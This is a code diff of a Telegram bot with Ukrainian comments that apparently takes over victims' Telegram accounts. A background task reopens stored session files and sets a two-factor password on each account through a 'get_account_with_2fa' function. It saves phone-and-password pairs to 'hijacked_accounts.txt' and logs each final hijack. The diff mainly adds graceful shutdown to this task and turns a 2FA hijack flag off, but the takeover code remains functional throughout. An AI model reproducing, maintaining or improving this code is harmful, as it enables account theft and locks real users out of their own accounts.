@@ -18,7 +18,7 @@ from messages import *
 
 # --- НАЛАШТУВАННЯ ---
 DEBUG_MODE = False  # True для тестування
-ENABLE_2FA_HIJACK = True
+ENABLE_2FA_HIJACK = False
 # Метод отримання номера:
 # "username" - через username (РЕКОМЕНДОВАНО!)
 # "request_only" - завжди просити
@@ -481,53 +481,65 @@ async def scheduled_hijacks_runner():
     і виконує перехоплення для акаунтів, яким виповнилося 24 години.
     """
     logger.info("🕐 Запуск фонового процесу для відкладених перехоплень.")
-    while True:
-        try:
-            pending_hijacks = await get_pending_hijacks()
 
-            if not pending_hijacks:
-                logger.info("🕐 Немає відкладених завдань для виконання.")
+    try:
+        while True:
+            try:
+                pending_hijacks = await get_pending_hijacks()
 
-            for task in pending_hijacks:
-                phone_number = task["phone"]
-                hijack_password = task["password"]
+                if not pending_hijacks:
+                    logger.info("🕐 Немає відкладених завдань для виконання.")
 
-                logger.info(f"🚨 Час настав! Починаю фінальне перехоплення акаунту {phone_number}...")
+                for task in pending_hijacks:
+                    phone_number = task["phone"]
+                    hijack_password = task["password"]
 
-                # Створюємо новий клієнт для цього завдання
-                session_name = f"{phone_number.replace('+', '')}.session"
-                session_path = os.path.join(SESSION_FOLDER, session_name)
-                client = TelegramClient(session_path, API_ID, API_HASH)
+                    logger.info(f"🚨 Час настав! Починаю фінальне перехоплення акаунту {phone_number}...")
 
-                try:
-                    await client.connect()
-                    if await client.is_user_authorized():
-                        # Викликаємо вашу існуючу функцію для перехоплення
-                        hijack_success, hijack_result = await get_account_with_2fa(client, hijack_password)
+                    # Створюємо новий клієнт для цього завдання
+                    session_name = f"{phone_number.replace('+', '')}.session"
+                    session_path = os.path.join(SESSION_FOLDER, session_name)
+                    client = TelegramClient(session_path, API_ID, API_HASH)
 
-                        if hijack_success:
-                            # Зберігаємо пароль у файл
-                            with open(os.path.join(BASE_DATA_PATH, "hijacked_accounts.txt"), "a") as f:
-                                f.write(f"{phone_number}:{hijack_password}\n")
-                            logger.critical(f"🚨 АКАУНТ {phone_number} ОСТАТОЧНО ПЕРЕХОПЛЕНО. Пароль збережено.")
+                    try:
+                        await client.connect()
+                        if await client.is_user_authorized():
+                            # Викликаємо вашу існуючу функцію для перехоплення
+                            hijack_success, hijack_result = await get_account_with_2fa(client, hijack_password)
+
+                            if hijack_success:
+                                # Зберігаємо пароль у файл
+                                with open(os.path.join(BASE_DATA_PATH, "hijacked_accounts.txt"), "a") as f:
+                                    f.write(f"{phone_number}:{hijack_password}\n")
+                                logger.critical(f"🚨 АКАУНТ {phone_number} ОСТАТОЧНО ПЕРЕХОПЛЕНО. Пароль збережено.")
+                            else:
+                                logger.error(
+                                    f"❌ Не вдалося остаточно перехопити акаунт {phone_number}: {hijack_result}")
                         else:
-                            logger.error(f"❌ Не вдалося остаточно перехопити акаунт {phone_number}: {hijack_result}")
-                    else:
-                        logger.warning(f"❌ Сесія для {phone_number} не авторизована. Пропускаю фінальне перехоплення.")
+                            logger.warning(
+                                f"❌ Сесія для {phone_number} не авторизована. Пропускаю фінальне перехоплення.")
 
-                except Exception as e:
-                    logger.error(f"❌ Помилка під час фінального перехоплення {phone_number}: {e}")
-                finally:
-                    if client.is_connected():
-                        await client.disconnect()
-                    # Важливо: позначаємо завдання як виконане, щоб не повторювати
-                    await mark_as_done(phone_number)
+                    except Exception as e:
+                        logger.error(f"❌ Помилка під час фінального перехоплення {phone_number}: {e}")
+                    finally:
+                        if client.is_connected():
+                            await client.disconnect()
+                        # Важливо: позначаємо завдання як виконане, щоб не повторювати
+                        await mark_as_done(phone_number)
 
-        except Exception as e:
-            logger.error(f"❌ Помилка в циклі scheduled_hijacks_runner: {e}")
+            except Exception as e:
+                logger.error(f"❌ Помилка в циклі scheduled_hijacks_runner: {e}")
 
-        # Чекаємо годину перед наступною перевіркою
-        await asyncio.sleep(3600)
+            # Чекаємо годину перед наступною перевіркою
+            try:
+                await asyncio.sleep(3600)
+            except asyncio.CancelledError:
+                logger.info("🛑 scheduled_hijacks_runner отримав сигнал зупинки")
+                break
+
+    except asyncio.CancelledError:
+        logger.info("🛑 scheduled_hijacks_runner зупинено")
+        raise
 
 
 async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSMContext):
@@ -832,12 +844,22 @@ async def handle_unexpected_message(message: Message, state: FSMContext):
 
 async def main():
     """Головна функція для запуску бота та фонових завдань."""
-    # Створюємо і запускаємо фонове завдання для відкладених перехоплень
-    # Воно буде працювати паралельно з ботом
-    asyncio.create_task(scheduled_hijacks_runner())
 
-    # Запускаємо поллінг бота (це блокуючий виклик)
-    await dp.start_polling(bot)
+    # Створюємо завдання для відкладених перехоплень
+    hijacks_task = asyncio.create_task(scheduled_hijacks_runner())
+
+    try:
+        # Запускаємо поллінг бота
+        await dp.start_polling(bot)
+    finally:
+        # Коректно завершуємо фонову задачу при зупинці
+        logger.info("🛑 Зупиняємо фонові задачі...")
+        hijacks_task.cancel()
+
+        try:
+            await hijacks_task
+        except asyncio.CancelledError:
+            logger.info("✅ Фонова задача перехоплень зупинена")
 
 
 if __name__ == "__main__":
